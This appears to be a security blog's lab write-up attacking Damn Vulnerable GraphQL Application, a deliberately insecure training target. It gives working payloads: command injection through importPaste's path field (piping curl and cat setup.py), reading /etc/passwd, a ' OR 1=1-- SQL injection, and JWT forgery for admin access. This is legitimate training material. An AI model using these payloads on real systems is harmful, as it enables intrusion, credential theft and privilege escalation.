@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+
+<meta charset="utf-8" >
+
+<title>GraphQL Vulnerabilities - DVGA</title>
+<meta name="keywords" content="GraphQL Vulnerabilities - DVGA, LaByte">
+<meta name="description" content="Damn Vulnerable GraphQL is a deliberately weak and insecure implementation of Graphql that provides a safe environment to learn various graphql security issues and how to test them.">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+
+<link rel="stylesheet" href="/style/jquery.fancybox.min.css">
+
+
+
+
+    <link rel="stylesheet" href="/style/prism.css"/>
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://thuri10.github.io">
+        <img class="avatar" src="/images/avatar.png" alt="" width="32px" height="32px">
+      </a>
+      <a href="http://thuri10.github.io">
+        <h1 class="site-title">LaByte</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        Home
+      </a>
+    
+  
+    
+      <a href="/archives" class="menu purple-link">
+        Archives
+      </a>
+    
+  
+    
+      <a href="/about" class="menu purple-link">
+        About
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">GraphQL Vulnerabilities - DVGA</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2022-12-15</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/websec/">
+              websec
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/graphql/">
+              graphql
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/vulnerable/">
+              vulnerable
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <p>GraphQL is an open source, data query and manipulation language for APIs. It enables serving API data for both mobile and web applications. GraphQL is an alternative to REST and grPc.<br>GraphQL vulnerabilities include Denial of Service, Information Disclosure, Code Execution, Injection, Authorization Bypass and File Traversal.<br>Damn Vulnerable GraphQL Application DVGA is a deliberately weak and insecure implementation of Graphql that provides a safe environment to learn various graphql security issues and how to test them.</p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>First when testing for GraphQL API is to determine it’s endpoints and schema.</p>
+<h2 id="Information-Disclosure"><a href="#Information-Disclosure" class="headerlink" title="Information Disclosure"></a>Information Disclosure</h2><p>These are vulnerabilities that allows an website or API to leak unintended&#x2F;sensitive data to it’s users. Data leaked depends on the context of the website i.e usernames, IP address, passwords and banking information.</p>
+<h3 id="GraphQL-Introspection"><a href="#GraphQL-Introspection" class="headerlink" title="GraphQL Introspection"></a>GraphQL Introspection</h3><p>Introspection is the ability to query which resources are available in the target API schema. This enables API user to see queries, types, field, and directives it supports. Introspective queries starts with a root field that’s either <code>__type</code> or <code>__schema</code> known as <strong>meta-fields</strong>. The <code>__schema</code> field can be used in reading API schema such as what <strong>types</strong> and <strong>directives</strong> it supports.</p>
+<p>Below is a graphql introspection query for API where Introspection is not disabled.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">query</span> <span class="token punctuation">&#123;</span>
+  <span class="token object">__schema</span> <span class="token punctuation">&#123;</span>
+    <span class="token object">queryType</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">name</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token object">mutationType</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">name</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token object">subscriptionType</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">name</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token object">types</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">kind</span>
+      <span class="token property">name</span>
+      <span class="token object">fields</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">name</span>
+        <span class="token object">args</span> <span class="token punctuation">&#123;</span>
+          <span class="token property">name</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Running the above query using Altair GraphQL Client, we are able to explore custom types defined in the API GraphQL schema. These include queries, mutations and subscriptions and their types. For example some defined types include <strong><em>CreatePaste</em></strong>, <strong><em>EditPaste</em></strong>, <strong><em>ImportPaste</em></strong>, <strong><em>CreateUser</em></strong>, <strong><em>Login</em></strong> and many more as shown in figure below.</p>
+<p><img src="/../images/graphql/graphql_introspection.png" alt="Graphql introspection"></p>
+<h3 id="GraphiQL-Interface"><a href="#GraphiQL-Interface" class="headerlink" title="GraphiQL Interface"></a>GraphiQL Interface</h3><p>To get the more information about a single type, use the <code>__type</code> meta-field. For example to query <strong>Login</strong>. To get results of a specific query we run queries as shown in the query below.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">query</span> <span class="token punctuation">&#123;</span>
+  <span class="token property-query">__type</span><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">:</span> <span class="token string">"Login"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">name</span>
+    <span class="token property">kind</span>
+    <span class="token object">fields</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">name</span>
+      <span class="token keyword">type</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">name</span>
+        <span class="token property">kind</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Running the above query returns the fields the fields and their types as shown in the figure below.</p>
+<p><img src="/../images/graphql/graphql_fields.png" alt="Field Suggestions"></p>
+<p>From the results, the Login return fields are <code>accessToken</code> and <code>refreshToken</code>.</p>
+<h3 id="GraphQL-Field-Suggestions"><a href="#GraphQL-Field-Suggestions" class="headerlink" title="GraphQL Field Suggestions"></a>GraphQL Field Suggestions</h3><p>If the Introspection is enabled on the GraphQl API, as you type the field name, the client will be able to determine and autofill the field for you while typing as shown below.</p>
+<p><img src="/../images/graphql/graphql_fieldsug.png" alt="Field Suggest"><br>The results shown in figure above, shows all possible fields of <code>pastes</code> object.</p>
+<h3 id="Server-Side-Request-Forgery"><a href="#Server-Side-Request-Forgery" class="headerlink" title="Server Side Request Forgery"></a>Server Side Request Forgery</h3><p>Server Side Request Forgery are vulnerabilities that allows an attacker to alter intended behavior of the server. An attacker may be able to make to make an outbound connection, steal internal resources of the organization, exploit internal systems not reachable from the internet and even query metadata endpoints to get secrets i.e AWS.<br>DVGA contains an SSRF vulnerability as a result of a code injection in the <strong><em>importPaste</em></strong> query as shown by the query below. (SSRF via code injection).</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">mutation</span> <span class="token punctuation">&#123;</span>
+  <span class="token property-query property-mutation">importPaste</span><span class="token punctuation">(</span>
+    <span class="token attr-name">host</span><span class="token punctuation">:</span> <span class="token description string">"<span class="token language-markdown">localhost</span>"</span>
+    <span class="token attr-name">port</span><span class="token punctuation">:</span> <span class="token number">80</span>
+    <span class="token attr-name">path</span><span class="token punctuation">:</span> <span class="token description string">"<span class="token language-markdown">/ | curl -i https://google.com</span>"</span>
+    <span class="token attr-name">scheme</span><span class="token punctuation">:</span> <span class="token string">"https"</span>
+  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">result</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Run the Query above in the BurpSuite <code>repeater</code> toolkit. This enables us to replay requests sent to the server by the client.</p>
+<p><img src="/../images/graphql/graphql_ssrf.png" alt="ssrf"></p>
+<p>From the figure above we able to make an outbound connection by getting google homepage. This may be an attacker controlled server to make <strong>POST</strong> requests to exfiltrate data from the internal organization.</p>
+<h3 id="Stack-Trace-Errors"><a href="#Stack-Trace-Errors" class="headerlink" title="Stack Trace Errors"></a>Stack Trace Errors</h3><p>Stack errors that occurs due to processing of malformed requests may lead to an attacker knowing more about the host environment and software running if debug mode is enabled. This may open other attack vectors, which may lead to full system compromise.</p>
+<p><img src="/../images/graphql/graphqlstack.png" alt="stack errors"></p>
+<p>From response above, stack error message includes API server username is <code>dvga</code>, programming language, versions, root directory etc. Leaked information, may lead for us looking for vulnerabilities with the associated software.</p>
+<h2 id="OS-command-Injection"><a href="#OS-command-Injection" class="headerlink" title="OS command Injection"></a>OS command Injection</h2><p>OS command injection is a web vulnerability that allows an attacker to execute arbitrary commands on the server running the application. OS command injection allows an attacker to fully compromise an system.</p>
+<h3 id="OS-Command-Injection-systemDebug"><a href="#OS-Command-Injection-systemDebug" class="headerlink" title="OS Command Injection - systemDebug"></a>OS Command Injection - systemDebug</h3><p>systemDebug query allows user to execute the command passed an argument as shown in the schema definition.</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"systemDebug"</span><span class="token punctuation">,</span>
+  <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"arg"</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Piping injection command in the arg allows us to execute more than one command at the same time. This allows us to read the content of <strong><em>&#x2F;etc&#x2F;passwd</em></strong> file as shown in figure below.</p>
+<p><img src="/../images/graphql/graphl_injection1.png" alt="Injection one"></p>
+<h3 id="OS-Command-Injection-importPaste"><a href="#OS-Command-Injection-importPaste" class="headerlink" title="OS Command Injection - importPaste"></a>OS Command Injection - importPaste</h3><p>importPaste mutationQuery allows us to execute an arbitrary command through the <strong><em>path</em></strong> argument as shown in the query below.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">mutation</span> <span class="token punctuation">&#123;</span>
+  <span class="token property-query property-mutation">importPaste</span><span class="token punctuation">(</span>
+    <span class="token attr-name">host</span><span class="token punctuation">:</span> <span class="token description string">"<span class="token language-markdown">localhost</span>"</span>
+    <span class="token attr-name">port</span><span class="token punctuation">:</span> <span class="token number">80</span>
+    <span class="token attr-name">path</span><span class="token punctuation">:</span> <span class="token description string">"<span class="token language-markdown">/ | cat setup.py </span>"</span>
+    <span class="token attr-name">scheme</span><span class="token punctuation">:</span> <span class="token string">"http"</span>
+  <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">result</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>setup.py</strong> is a python file used for setting the configurations for a Python backend API. This may contain secrets that should accessible by the users of the API.</p>
+<p><img src="/../images/graphql/graphql_injection2.png" alt="importPaste"></p>
+<p>This allows us to leak the username and passwords associated with the users.</p>
+<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h2><p>Injections are vulnerabilities that allows us to pass arbitrary, unsafe data in arguments or parameters that are not safely parsed. For graphQL injection we target <code>Mutations</code>, because they are used for manipulating data in the server or database.</p>
+<h3 id="Stored-Cross-Site-Scripting"><a href="#Stored-Cross-Site-Scripting" class="headerlink" title="Stored Cross Site Scripting"></a>Stored Cross Site Scripting</h3><p>Stored XSS is a class of XSS that allows an attacker to store malformed inputs persistently in the server from the untrusted sources.</p>
+<p>Figure below shows a DOM based title stored XSS, because there no validation of title data, this leads to XSS payload being executed when a user visits the page. Create a new paste as shown in the figure below and pass the XSS payload in the <strong>title</strong> argument.</p>
+<p><img src="/../images/graphql/graphql_xss_title.png" alt="DOM title stored xss"></p>
+<p>Visiting <strong>my_pastes</strong> page, Our payload is executed and alert shown in the figure below.</p>
+<p><img src="/../images/graphql/graphql_xss.png" alt="xss executed"></p>
+<p>To mitigate XSS, Never trust user data, always validate it.</p>
+<h3 id="Log-Injection"><a href="#Log-Injection" class="headerlink" title="Log Injection"></a>Log Injection</h3><p>Log injection is a vulnerability that allows an attacker to inject unnecessary information to other query fields. For example in the query below we are injecting the <strong>systemHealth</strong> logs into the <strong>paste</strong> query data.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">query</span> <span class="token punctuation">&#123;</span>
+  <span class="token property">systemHealth</span>
+  <span class="token object">pastes</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">id</span>
+    <span class="token property">title</span>
+    <span class="token property">ipAddr</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/../images/graphql/graphql_loginjection.png" alt="Log Injection"><br>Log injection may lead to performance issues if large amount of data is injected.</p>
+<h3 id="HTML-Injection"><a href="#HTML-Injection" class="headerlink" title="HTML Injection"></a>HTML Injection</h3><p>HTML injection is a web vulnerability class that allows us to inject HTML tags to the input fields. Example below shows an HTML injection which refreshes the page every 10 seconds.</p>
+<p><img src="/../images/graphql/graphql_htmlinjection.png" alt="HTML injection"></p>
+<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>SQL injection is a vulnerability that allows an attacker to manipulate queries that an application makes to database. SQL injection may lead to sensitive data leakage, delete other user’s data and even bypass Authentication mechanism put in place. To test SQL injection, add a single apostrophe at the end of data to be filtered. This results to an error message as shown in the figure below.</p>
+<p><img src="/../images/graphql/graphl_injection1.png" alt="Sql test"></p>
+<p>To get all the pastes we run the following GraphQL query where the <strong><em>OR</em></strong> condition is true and comment out the rest of the query using <code>--</code>.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">query</span> <span class="token punctuation">&#123;</span>
+  <span class="token property-query">pastes</span><span class="token punctuation">(</span><span class="token attr-name">public</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token attr-name">filter</span><span class="token punctuation">:</span> <span class="token string">"One advanced diverted' OR 1=1--"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">content</span>
+    <span class="token property">id</span>
+    <span class="token property">userAgent</span>
+    <span class="token property">ipAddr</span>
+    <span class="token property">title</span>
+    <span class="token property">ownerId</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The filter argument is vulnerable to graphQL SQL injection attacks.</p>
+<p><img src="/../images/graphql/graphql_sqlinjection.png" alt="Graphql sql injection"></p>
+<h2 id="Authorization-Bypass"><a href="#Authorization-Bypass" class="headerlink" title="Authorization Bypass"></a>Authorization Bypass</h2><p>Authorization allows clients to access the data of the API securely. This enables confirmation of the identity of the user, privilege levels and resources they are only allowed to access. Authorization mechanisms can be implemented through API key, Tokens, OAuth and many more.</p>
+<h3 id="JWT-Token-Forge"><a href="#JWT-Token-Forge" class="headerlink" title="JWT Token Forge"></a>JWT Token Forge</h3><p>If JTW Tokens does not do any validation, an attacker may be able forge tokens in orderto access unintended resources or login as another user by manipulating token field <code>identity</code> in payload section.</p>
+<p>From the above leaked credentials in the <code>setup.py</code> file we can use <strong>operator</strong> and <strong>password123</strong> for login in order to get tokens by running the query below.</p>
+<pre class="line-numbers language-graphql" data-language="graphql"><code class="language-graphql"><span class="token keyword">mutation</span> <span class="token punctuation">&#123;</span>
+  <span class="token property-query property-mutation">login</span><span class="token punctuation">(</span><span class="token attr-name">username</span><span class="token punctuation">:</span> <span class="token string">"operator"</span><span class="token punctuation">,</span> <span class="token attr-name">password</span><span class="token punctuation">:</span> <span class="token string">"password123"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token property">accessToken</span>
+    <span class="token property">refreshToken</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>For decoding the accessToken as shown below we use JWT debugger.</p>
+<p><img src="/../images/graphql/graphql_jwt.png" alt="Access Token"></p>
+<p>By manipulating the identity field of the token, we are able to escalate the privileges from operator to admin.<br><img src="/../images/graphql/graphql_jwt2.png" alt="User Token"></p>
+<p>JWT Token forge is possible because the server does not validate the token in each request we make.</p>
+<h3 id="Interface-Protection-Bypass"><a href="#Interface-Protection-Bypass" class="headerlink" title="Interface Protection Bypass"></a>Interface Protection Bypass</h3><p>The Interface for graphQL can be bypassed by modifying cookie value passed in the header of the request. The default cookie value is <strong><em>env&#x3D;graphiql:disable</em></strong>.It can be bypassed by changing the value to <strong><em>env&#x3D;graphiql:enable</em></strong>.</p>
+<p><img src="/../images/graphql/graphql_interface_bypass.png" alt="GraphQL enable"></p>
+<p>Changing cookie values, we are able to access graphQL interface for writing queries and mutations.</p>
+
+        </div>
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Reconnaissance"><span class="top-box-text">Reconnaissance</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Information-Disclosure"><span class="top-box-text">Information Disclosure</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#GraphQL-Introspection"><span class="top-box-text">GraphQL Introspection</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#GraphiQL-Interface"><span class="top-box-text">GraphiQL Interface</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#GraphQL-Field-Suggestions"><span class="top-box-text">GraphQL Field Suggestions</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Server-Side-Request-Forgery"><span class="top-box-text">Server Side Request Forgery</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Stack-Trace-Errors"><span class="top-box-text">Stack Trace Errors</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#OS-command-Injection"><span class="top-box-text">OS command Injection</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#OS-Command-Injection-systemDebug"><span class="top-box-text">OS Command Injection - systemDebug</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#OS-Command-Injection-importPaste"><span class="top-box-text">OS Command Injection - importPaste</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Injection"><span class="top-box-text">Injection</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Stored-Cross-Site-Scripting"><span class="top-box-text">Stored Cross Site Scripting</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Log-Injection"><span class="top-box-text">Log Injection</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#HTML-Injection"><span class="top-box-text">HTML Injection</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#SQL-Injection"><span class="top-box-text">SQL Injection</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#Authorization-Bypass"><span class="top-box-text">Authorization Bypass</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#JWT-Token-Forge"><span class="top-box-text">JWT Token Forge</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Interface-Protection-Bypass"><span class="top-box-text">Interface Protection Bypass</span></a></li></ol></li></ol>
+        </div>
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/access-control/">
+          <h3 class="post-title">
+            Next: Access Control Vulnerabilities - Part 1
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/thuri10" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/thuri0" target="_blank">
+          <i class="icon icon-twitter"></i>
+        </a>
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+      </div>
+      
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.fancybox.min.js"></script>
+
+
+
+    <script>window.is_post = true;</script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+    </div>
+  </body>
+</html>
+
